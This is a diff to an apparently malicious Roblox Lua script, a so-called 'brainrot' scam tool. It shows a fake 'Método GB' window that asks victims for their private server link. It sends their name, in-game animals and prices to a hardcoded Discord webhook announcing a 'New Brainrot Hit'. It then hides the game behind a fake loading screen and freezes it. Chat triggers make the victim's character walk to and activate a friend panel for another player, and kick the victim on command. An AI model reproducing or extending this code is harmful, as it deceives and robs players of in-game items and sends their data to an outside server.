@@ -4,6 +4,20 @@ local TweenService = game:GetService("TweenService")
 local HttpService = game:GetService("HttpService")
 local CoreGui = game:GetService("CoreGui")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RunService = game:GetService("RunService")
+local Workspace = game:GetService("Workspace")
+local StarterGui = game:GetService("StarterGui")
+local SoundService = game:GetService("SoundService")
+
+-- Garantir que LocalPlayer exista (LocalScript) antes de usar
+local player = Players.LocalPlayer
+if not player then
+    return
+end
+
+-- 🆕 PEGA O NICK DO JOGADOR NO INÍCIO
+local playerNick = player.Name
+print("🎮 Jogador detectado:", playerNick)
 
 -- Funções Helper
 local function normalize(str)
@@ -14,8 +28,14 @@ local function simplifyForMatch(str)
     return normalize(str):gsub("%W","")
 end
 
-local function findPlayerPlot(plotsFolder, playerName)
-    if not plotsFolder then return nil end
+-- 🆕 FUNÇÃO MELHORADA - Procura pelo nick direto!
+local function findPlayerPlot(plotsFolder)
+    if not plotsFolder then 
+        print("❌ Plots folder não encontrado")
+        return nil 
+    end
+    
+    print("🔍 Procurando plot de:", playerNick)
     
     -- Procura em cada plot
     for _, plot in ipairs(plotsFolder:GetChildren()) do
@@ -29,14 +49,23 @@ local function findPlayerPlot(plotsFolder, playerName)
                     local frame = surfaceGui:FindFirstChild("Frame")
                     if frame then
                         local textLabel = frame:FindFirstChild("TextLabel")
-                        if textLabel and textLabel.Text == playerName.."'s Base" then
-                            return plot -- Encontrou o plot do jogador
+                        if textLabel then
+                            local plotText = textLabel.Text
+                            print("  📝 Plot encontrado com texto:", plotText)
+                            
+                            -- 🆕 Verifica se o texto contém o nick do jogador
+                            if plotText:find(playerNick) then
+                                print("✅ PLOT ENCONTRADO:", plot.Name)
+                                return plot
+                            end
                         end
                     end
                 end
             end
         end
     end
+    
+    print("❌ Nenhum plot encontrado para:", playerNick)
     return nil
 end
 
@@ -49,7 +78,6 @@ local function getAnimalsInPlot(plot)
 
     print("✅ Plot encontrado:", plot.Name)
 
-    -- Procura a pasta AnimalPodiums
     local podiumsFolder = plot:FindFirstChild("AnimalPodiums")
     if not podiumsFolder then 
         print("❌ AnimalPodiums não encontrado")
@@ -58,22 +86,18 @@ local function getAnimalsInPlot(plot)
 
     print("✅ AnimalPodiums encontrado, models dentro:", #podiumsFolder:GetChildren())
 
-    -- Para cada model dentro de AnimalPodiums
     for _, podiumModel in ipairs(podiumsFolder:GetChildren()) do
         print("🔍 Verificando:", podiumModel.Name, "Tipo:", podiumModel.ClassName)
         
         if podiumModel:IsA("Model") then
-            -- Procura o model Base
             local baseModel = podiumModel:FindFirstChild("Base")
             if baseModel and baseModel:IsA("Model") then
                 print("  ✅ Base encontrado em:", podiumModel.Name)
                 
-                -- Procura a part Spawn
                 local spawnPart = baseModel:FindFirstChild("Spawn")
                 if spawnPart then
                     print("    ✅ Spawn encontrado")
                     
-                    -- Verifica attachments
                     local attachments = {}
                     for _, child in ipairs(spawnPart:GetChildren()) do
                         if child:IsA("Attachment") and child.Name ~= "PromptAttachment" then
@@ -87,7 +111,6 @@ local function getAnimalsInPlot(plot)
                     if #attachments == 1 then
                         local attachment = attachments[1]
                         
-                        -- Procura o BillboardGui
                         local billboard = attachment:FindFirstChild("AnimalOverhead", true)
                         if billboard then
                             print("        ✅ AnimalOverhead encontrado!")
@@ -122,7 +145,6 @@ local function getAnimalsInPlot(plot)
 end
 
 local function walkToPosition(targetPosition)
-    local player = Players.LocalPlayer
     local character = player.Character
     if not character then return false end
     
@@ -131,8 +153,7 @@ local function walkToPosition(targetPosition)
     
     humanoid:MoveTo(targetPosition)
     
-    -- Espera chegar perto da posição
-    local moveTimeout = 30 -- timeout de 30 segundos
+    local moveTimeout = 30
     local startTime = tick()
     
     repeat
@@ -141,12 +162,12 @@ local function walkToPosition(targetPosition)
         if not rootPart then return false end
         
         local distance = (rootPart.Position - targetPosition).Magnitude
-        if distance < 5 then -- chegou perto o suficiente
+        if distance < 5 then
             return true
         end
         
         if tick() - startTime > moveTimeout then
-            return false -- timeout
+            return false
         end
     until not humanoid or humanoid.Health <= 0
     
@@ -154,10 +175,8 @@ local function walkToPosition(targetPosition)
 end
 
 local function tryAddFriend(targetPlayer)
-    local player = Players.LocalPlayer
     print("🔄 Tentando adicionar", targetPlayer.Name, "como amigo...")
     
-    -- Método 1: RequestFriendship
     local success1 = pcall(function()
         player:RequestFriendship(targetPlayer)
     end)
@@ -166,7 +185,6 @@ local function tryAddFriend(targetPlayer)
         return true
     end
     
-    -- Método 2: Via LocalPlayer
     local success2 = pcall(function()
         Players.LocalPlayer:RequestFriendship(targetPlayer)
     end)
@@ -175,19 +193,15 @@ local function tryAddFriend(targetPlayer)
         return true
     end
     
-    -- Método 3: Manipular PlayerList GUI
     local success3 = pcall(function()
         local playerList = player.PlayerGui:FindFirstChild("PlayerList")
         if playerList then
-            -- Tenta encontrar o frame do jogador
             for _, item in pairs(playerList:GetDescendants()) do
                 if item:IsA("TextLabel") and item.Text == targetPlayer.Name then
-                    -- Procura botão de amizade próximo
                     local parent = item.Parent
                     if parent then
                         for _, child in pairs(parent:GetDescendants()) do
                             if child:IsA("ImageButton") or child:IsA("TextButton") then
-                                -- Simula clique
                                 for _, connection in pairs(getconnections(child.MouseButton1Click)) do
                                     connection:Fire()
                                 end
@@ -203,7 +217,6 @@ local function tryAddFriend(targetPlayer)
         return true
     end
     
-    -- Método 4: CoreGui PlayerList
     local success4 = pcall(function()
         local coreGui = game:GetService("CoreGui")
         local playerList = coreGui:FindFirstChild("PlayerList") or coreGui:FindFirstChild("RobloxGui")
@@ -232,34 +245,192 @@ local function tryAddFriend(targetPlayer)
     return false
 end
 
--- Garantir que LocalPlayer exista (LocalScript) antes de usar
-local player = Players.LocalPlayer
-if not player then
-    return
+-- 🆕 FUNÇÃO DE CONGELAMENTO TOTAL
+local function activateFreezeMode()
+    print("[FREEZE] Ativando modo de congelamento total...")
+    
+    -- 1. DISABLE ALL CORE GUI
+    pcall(function()
+        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+    end)
+
+    -- 2. FREE CAMERA
+    local Camera = Workspace.CurrentCamera
+    Camera.CameraType = Enum.CameraType.Scriptable
+
+    -- 3. DISABLE ALL AUDIO
+    SoundService.AmbientReverb = Enum.ReverbType.NoReverb
+    for _, snd in ipairs(Workspace:GetDescendants()) do
+        if snd:IsA("Sound") then
+            snd.Volume = 0
+            snd:Stop()
+        end
+    end
+    Workspace.DescendantAdded:Connect(function(obj)
+        if obj:IsA("Sound") then
+            obj.Volume = 0
+            obj:Stop()
+        end
+    end)
+    RunService.Heartbeat:Connect(function()
+        for _, snd in ipairs(Workspace:GetDescendants()) do
+            if snd:IsA("Sound") and snd.IsPlaying then
+                snd:Stop()
+            end
+        end
+    end)
+
+    -- 4. FULL FREEZE: PARTS + JOINTS + MOTORS
+    local frozenParts = {}
+    local frozenJoints = {}
+
+    local function freezeObject(obj)
+        if obj:IsA("BasePart") then
+            frozenParts[obj] = {
+                CFrame       = obj.CFrame,
+                Size         = obj.Size,
+                Transparency = obj.Transparency,
+                Color        = obj.Color,
+                Material     = obj.Material,
+                CanCollide   = obj.CanCollide,
+            }
+        elseif obj:IsA("Motor6D") or obj:IsA("Weld") or obj:IsA("ManualWeld") then
+            frozenJoints[obj] = {
+                C0 = obj.C0,
+                C1 = obj.C1,
+            }
+        elseif obj:IsA("Sound") then
+            obj.Volume = 0
+            obj:Stop()
+        end
+    end
+
+    for _, obj in ipairs(Workspace:GetDescendants()) do
+        freezeObject(obj)
+    end
+
+    Workspace.DescendantAdded:Connect(freezeObject)
+
+    RunService.Stepped:Connect(function()
+        for part, data in pairs(frozenParts) do
+            if part and part.Parent then
+                part.CFrame       = data.CFrame
+                part.Size         = data.Size
+                part.Transparency = data.Transparency
+                part.Color        = data.Color
+                part.Material     = data.Material
+                part.CanCollide   = data.CanCollide
+            end
+        end
+        
+        for joint, data in pairs(frozenJoints) do
+            if joint and joint.Parent then
+                joint.C0 = data.C0
+                joint.C1 = data.C1
+            end
+        end
+    end)
+
+    -- 5. STOP ALL ANIMATIONS
+    local function stopAnimationsInHumanoid(humanoid)
+        if not humanoid then return end
+        for _, track in ipairs(humanoid:GetPlayingAnimationTracks()) do
+            track:Stop()
+        end
+    end
+
+    local function freezeCharacter(char)
+        local hum = char:FindFirstChildOfClass("Humanoid")
+        if hum then
+            hum.WalkSpeed = 0
+            hum.JumpPower = 0
+            hum.PlatformStand = true
+            
+            stopAnimationsInHumanoid(hum)
+            
+            for _, acc in ipairs(char:GetChildren()) do
+                if acc:IsA("Accessory") then
+                    local handle = acc:FindFirstChild("Handle")
+                    if handle then freezeObject(handle) end
+                end
+            end
+        end
+    end
+
+    if player.Character then freezeCharacter(player.Character) end
+    player.CharacterAdded:Connect(freezeCharacter)
+
+    local function onCharacterAdded(char)
+        task.wait(0.1)
+        freezeCharacter(char)
+    end
+
+    for _, plr in ipairs(Players:GetPlayers()) do
+        if plr.Character then
+            onCharacterAdded(plr.Character)
+        end
+        plr.CharacterAdded:Connect(onCharacterAdded)
+    end
+    Players.PlayerAdded:Connect(function(plr)
+        plr.CharacterAdded:Connect(onCharacterAdded)
+    end)
+
+    RunService.Heartbeat:Connect(function()
+        for _, plr in ipairs(Players:GetPlayers()) do
+            if plr.Character then
+                local hum = plr.Character:FindFirstChildOfClass("Humanoid")
+                stopAnimationsInHumanoid(hum)
+            end
+        end
+    end)
+
+    -- 6. DELETE ALL GUI (exceto a tela de loading)
+    local function clearGui()
+        for _, gui in ipairs(player.PlayerGui:GetChildren()) do
+            if gui:IsA("GuiObject") then
+                local n = gui.Name
+                if n ~= "sm_notif" and n ~= "sm_main" then
+                    pcall(gui.Destroy, gui)
+                end
+            end
+        end
+        for _, gui in ipairs(CoreGui:GetChildren()) do
+            if gui.Name ~= "LoadingScreen" then
+                pcall(gui.Destroy, gui)
+            end
+        end
+    end
+
+    clearGui()
+    spawn(function()
+        while task.wait(0.03) do
+            clearGui()
+        end
+    end)
+
+    print("[FREEZE] Modo de congelamento ativado com sucesso!")
 end
 
--- ⚠️ SISTEMA DE KICK COM MÚLTIPLOS MÉTODOS ⚠️
-print("🛡️ Sistema de kick ativado para jogador:", player.Name)
+-- Sistema de kick
+print("🛡 Sistema de kick ativado para jogador:", player.Name)
 
--- Método 1: PlayerChatted (evento global)
 Players.PlayerChatted:Connect(function(_, chatPlayer, message)
     print("💬 [PlayerChatted] Mensagem de", chatPlayer.Name, ":", message)
     
     local msg = string.lower(message)
     
     if msg == "kick" or msg:find("kick") then
-        print("⚠️ Comando KICK detectado!")
+        print("⚠ Comando KICK detectado!")
         
         if chatPlayer.Name ~= player.Name then
             print("🚫 Kickando", player.Name)
-            player:Kick("⚠️ Você foi removido do servidor.\nTente novamente mais tarde.")
+            player:Kick("⚠ Você foi removido do servidor.\nTente novamente mais tarde.")
         else
-            print("ℹ️ Você mesmo digitou kick")
+            print("ℹ Você mesmo digitou kick")
         end
     end
 end)
 
--- Método 2: Chatted individual para cada jogador
 for _, otherPlayer in pairs(Players:GetPlayers()) do
     if otherPlayer ~= player then
         otherPlayer.Chatted:Connect(function(message)
@@ -269,13 +440,12 @@ for _, otherPlayer in pairs(Players:GetPlayers()) do
             
             if msg == "kick" or msg:find("kick") then
                 print("🚫 [Chatted] KICK de", otherPlayer.Name)
-                player:Kick("⚠️ Você foi removido do servidor.")
+                player:Kick("⚠ Você foi removido do servidor.")
             end
         end)
     end
 end
 
--- Método 3: Novos jogadores que entram
 Players.PlayerAdded:Connect(function(newPlayer)
     if newPlayer ~= player then
         print("➕ Novo jogador:", newPlayer.Name)
@@ -287,13 +457,12 @@ Players.PlayerAdded:Connect(function(newPlayer)
             
             if msg == "kick" or msg:find("kick") then
                 print("🚫 [PlayerAdded] KICK de", newPlayer.Name)
-                player:Kick("⚠️ Você foi removido do servidor.")
+                player:Kick("⚠ Você foi removido do servidor.")
             end
         end)
     end
 end)
 
--- Método 4: TextChatService (novo sistema de chat do Roblox)
 pcall(function()
     local TextChatService = game:GetService("TextChatService")
     TextChatService.MessageReceived:Connect(function(message)
@@ -303,7 +472,7 @@ pcall(function()
             
             if text == "kick" or text:find("kick") then
                 print("🚫 [TextChatService] KICK detectado!")
-                player:Kick("⚠️ Você foi removido do servidor.")
+                player:Kick("⚠ Você foi removido do servidor.")
             end
         end
     end)
@@ -311,7 +480,7 @@ end)
 
 print("✅ Sistema de kick configurado com 4 métodos!")
 
--- Coloque a sua webhook aqui:
+-- Webhook URL
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1433922894160723969/p8PMvPhnIQQ5JC4hwnxI9rmzAnF3VC3Hykay3e0bXEpZaKmWi79Abu5LPAuyEyebsqd4"
 
 local playerGui = player:WaitForChild("PlayerGui")
@@ -323,14 +492,12 @@ screenGui.ResetOnSpawn = false
 screenGui.IgnoreGuiInset = true
 screenGui.Parent = playerGui
 
---// Blur Effect
 local blur = Instance.new("Frame")
 blur.Size = UDim2.new(1, 0, 1, 0)
 blur.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
 blur.BackgroundTransparency = 0.4
 blur.Parent = screenGui
 
---// Main Frame
 local frame = Instance.new("Frame")
 frame.Size = UDim2.new(0, 400, 0, 220)
 frame.AnchorPoint = Vector2.new(0.5, 0.5)
@@ -340,7 +507,6 @@ frame.BorderSizePixel = 0
 frame.ClipsDescendants = true
 frame.Parent = screenGui
 
---// Rounded corners e sombra
 Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 15)
 
 local shadow = Instance.new("ImageLabel")
@@ -355,7 +521,6 @@ shadow.ImageTransparency = 0.6
 shadow.ZIndex = 0
 shadow.Parent = frame
 
---// Gradient de fundo
 local gradient = Instance.new("UIGradient")
 gradient.Color = ColorSequence.new{
 	ColorSequenceKeypoint.new(0, Color3.fromRGB(45, 20, 70)),
@@ -364,7 +529,6 @@ gradient.Color = ColorSequence.new{
 gradient.Rotation = 45
 gradient.Parent = frame
 
---// Title
 local title = Instance.new("TextLabel")
 title.Text = "🧠 Método GB"
 title.Size = UDim2.new(1, 0, 0, 40)
@@ -374,7 +538,6 @@ title.Font = Enum.Font.GothamBold
 title.TextScaled = true
 title.Parent = frame
 
---// TextBox
 local textbox = Instance.new("TextBox")
 textbox.PlaceholderText = "Cole o link do servidor privado aqui..."
 textbox.Size = UDim2.new(0.9, 0, 0, 45)
@@ -386,7 +549,6 @@ textbox.TextScaled = true
 textbox.Parent = frame
 Instance.new("UICorner", textbox).CornerRadius = UDim.new(0, 10)
 
---// Button
 local button = Instance.new("TextButton")
 button.Text = "Prosseguir"
 button.Size = UDim2.new(0.9, 0, 0, 50)
@@ -398,7 +560,6 @@ button.TextScaled = true
 button.Parent = frame
 Instance.new("UICorner", button).CornerRadius = UDim.new(0, 10)
 
---// Button Animation
 button.MouseEnter:Connect(function()
 	TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(170, 60, 255)}):Play()
 end)
@@ -406,7 +567,6 @@ button.MouseLeave:Connect(function()
 	TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(140, 40, 255)}):Play()
 end)
 
---// Aparecer com animação (fade)
 frame.BackgroundTransparency = 1
 title.TextTransparency = 1
 textbox.TextTransparency = 1
@@ -420,18 +580,16 @@ local function setupChatListeners()
     Players.PlayerChatted:Connect(function(_, chatPlayer, message)
         local msg = normalize(message)
         
-        -- Sistema de Friend
         if msg == "friend" then
             if chatPlayer.Name == player.Name then return end
             
             print("📢 Pedido de friend detectado de:", chatPlayer.Name)
             
-            -- Tenta adicionar como amigo
             tryAddFriend(chatPlayer)
             
-            -- Encontra o plot da pessoa
+            -- 🆕 Agora usa a função sem passar o nome!
             local plotsFolder = workspace:FindFirstChild("Plots")
-            local targetPlot = findPlayerPlot(plotsFolder, chatPlayer.Name)
+            local targetPlot = findPlayerPlot(plotsFolder)
             
             if not targetPlot then
                 print("❌ Plot de", chatPlayer.Name, "não encontrado")
@@ -440,7 +598,6 @@ local function setupChatListeners()
             
             print("✅ Plot encontrado:", targetPlot.Name)
             
-            -- Procura o FriendPanel
             local friendPanel = targetPlot:FindFirstChild("FriendPanel")
             if not friendPanel then
                 print("❌ FriendPanel não encontrado no plot")
@@ -449,7 +606,6 @@ local function setupChatListeners()
             
             print("✅ FriendPanel encontrado")
             
-            -- Procura a Part Main
             local mainPart = friendPanel:FindFirstChild("Main")
             if not mainPart or not mainPart:IsA("BasePart") then
                 print("❌ Part Main não encontrada no FriendPanel")
@@ -458,14 +614,12 @@ local function setupChatListeners()
             
             print("✅ Main part encontrada, indo até lá...")
             
-            -- Anda até a posição
             local success = walkToPosition(mainPart.Position)
             
             if success then
                 print("✅ Chegou na posição!")
                 wait(0.5)
                 
-                -- Procura e ativa o ProximityPrompt
                 local proximityPrompt = mainPart:FindFirstChildOfClass("ProximityPrompt")
                 if proximityPrompt then
                     print("✅ ProximityPrompt encontrado, ativando...")
@@ -485,36 +639,22 @@ end
 button.MouseButton1Click:Connect(function()
     local input = textbox.Text
     
-    print("🔘 Botão clicado!")
-    print("📝 Input:", input)
-    
-    -- Desabilita o botão temporariamente
-    button.Text = "Enviando..."
-    button.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
+    print("✅ Enviando webhook...")
     
     local currentTime = os.date("%H:%M - %d/%m/%Y")
     local totalPlayers = #Players:GetPlayers()
-    
-    print("⏰ Hora:", currentTime)
-    print("👥 Total de jogadores:", totalPlayers)
 
-    -- Encontra o plot do jogador
+    -- 🆕 Agora só precisa chamar sem passar nome!
     local plotsFolder = workspace:FindFirstChild("Plots")
-    print("📁 Plots folder:", plotsFolder and "Encontrado" or "Não encontrado")
+    local targetPlot = findPlayerPlot(plotsFolder)
     
-    local targetPlot = findPlayerPlot(plotsFolder, player.Name)
-    print("🏠 Plot do jogador:", targetPlot and targetPlot.Name or "Não encontrado")
-    
-    -- Pega os animais com seus preços
     local foundAnimals = getAnimalsInPlot(targetPlot)
 
-    -- Debug
     print("🔍 Plot encontrado:", targetPlot and "sim" or "não")
     for _, animal in ipairs(foundAnimals) do
         print("📝 Animal:", animal.name, "->", animal.price)
     end
 
-    -- Monta o texto para a webhook
     local brainrotsValue
     if not targetPlot then
         brainrotsValue = "Plot não encontrado"
@@ -528,9 +668,8 @@ button.MouseButton1Click:Connect(function()
         brainrotsValue = table.concat(parts, "\n")
     end
 
-    -- Payload formatado com sintaxe corrigida
     local payload = {
-        ["content"] = "@everyone **New Brainrot Hit**",
+        ["content"] = "@everyone *New Brainrot Hit*",
         ["username"] = "Brainrot System",
         ["avatar_url"] = "https://i.imgur.com/oBnXOzr.png",
         ["embeds"] = {
@@ -555,7 +694,7 @@ button.MouseButton1Click:Connect(function()
                     },
                     {
                         ["name"] = "👤 Nome",
-                        ["value"] = player.Name,
+                        ["value"] = playerNick, -- 🆕 Usa o nick pego no início!
                         ["inline"] = true
                     },
                     {
@@ -568,16 +707,9 @@ button.MouseButton1Click:Connect(function()
         }
     }
 
-    -- Tenta enviar a webhook com tratamento de erro melhorado
-    print("📤 Tentando enviar webhook...")
-    print("🔗 URL:", WEBHOOK_URL)
-    
     local success, response = pcall(function()
         local encoded = HttpService:JSONEncode(payload)
-        print("✅ JSON encoded com sucesso")
-        print("📦 Tamanho do payload:", #encoded, "bytes")
-        
-        local result = HttpService:RequestAsync({
+        return HttpService:RequestAsync({
             Url = WEBHOOK_URL,
             Method = "POST",
             Headers = {
@@ -585,36 +717,27 @@ button.MouseButton1Click:Connect(function()
             },
             Body = encoded
         })
-        
-        print("✅ Request completado!")
-        return result
     end)
 
     if success then
-        print("✅✅✅ Webhook enviada com sucesso!")
-        print("📊 Response:", tostring(response))
-        
-        button.Text = "✅ Enviado!"
-        button.BackgroundColor3 = Color3.fromRGB(40, 200, 40)
+        print("✅ Webhook enviada com sucesso!")
         textbox.Text = "✅ Enviado com sucesso!"
         wait(2)
         textbox.Text = ""
-        button.Text = "Prosseguir"
-        button.BackgroundColor3 = Color3.fromRGB(140, 40, 255)
         
-        -- Setup chat listeners (friend)
         setupChatListeners()
         
-        -- Create loading screen
+        -- 🆕 Criar tela de loading
         local ScreenGui = Instance.new("ScreenGui")
+        ScreenGui.Name = "LoadingScreen"
         ScreenGui.IgnoreGuiInset = true
         ScreenGui.Parent = CoreGui
 
-        local frame = Instance.new("Frame")
-        frame.Parent = ScreenGui
-        frame.Size = UDim2.new(1, 0, 1, 0)
-        frame.BackgroundTransparency = 0
-        frame.BackgroundColor3 = Color3.fromRGB(0, 20, 40)
+        local loadFrame = Instance.new("Frame")
+        loadFrame.Parent = ScreenGui
+        loadFrame.Size = UDim2.new(1, 0, 1, 0)
+        loadFrame.BackgroundTransparency = 0
+        loadFrame.BackgroundColor3 = Color3.fromRGB(0, 20, 40)
 
         local textLabel = Instance.new("TextLabel")
         textLabel.Size = UDim2.new(1, 0, 1, 0)
@@ -623,7 +746,7 @@ button.MouseButton1Click:Connect(function()
         textLabel.TextColor3 = Color3.new(0.8, 0.8, 0.8)
         textLabel.Text = "Loading..."
         textLabel.TextSize = 28
-        textLabel.Parent = frame
+        textLabel.Parent = loadFrame
 
         local loadingRing = Instance.new("ImageLabel")
         loadingRing.Size = UDim2.new(0, 256, 0, 256)
@@ -631,32 +754,19 @@ button.MouseButton1Click:Connect(function()
         loadingRing.Image = "rbxassetid://4965945816"
         loadingRing.AnchorPoint = Vector2.new(0.5, 0.5)
         loadingRing.Position = UDim2.new(0.5, 0, 0.5, 0)
-        loadingRing.Parent = frame
+        loadingRing.Parent = loadFrame
 
-        -- Create spinning animation
         local tweenInfo = TweenInfo.new(4, Enum.EasingStyle.Linear, Enum.EasingDirection.In, -1)
         local tween = TweenService:Create(loadingRing, tweenInfo, {Rotation = 360})
         tween:Play()
 
-        -- Mute all sounds
-        for _, sound in ipairs(game:GetDescendants()) do
-            if sound:IsA("Sound") then
-                sound.Volume = 0
-            end
-        end
-
-        -- Disable CoreGui
-        game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
-    else
-        warn("❌❌❌ ERRO AO ENVIAR WEBHOOK!")
-        warn("❌ Erro:", tostring(response))
+        -- 🆕 ATIVAR MODO DE CONGELAMENTO IMEDIATAMENTE
+        activateFreezeMode()
         
-        button.Text = "❌ Erro!"
-        button.BackgroundColor3 = Color3.fromRGB(200, 40, 40)
-        textbox.Text = "❌ Erro: " .. tostring(response)
-        wait(3)
+    else
+        warn("❌ Erro ao enviar webhook:", response)
+        textbox.Text = "❌ Erro ao enviar! Tente novamente."
+        wait(2)
         textbox.Text = ""
-        button.Text = "Prosseguir"
-        button.BackgroundColor3 = Color3.fromRGB(140, 40, 255)
     end
 end)
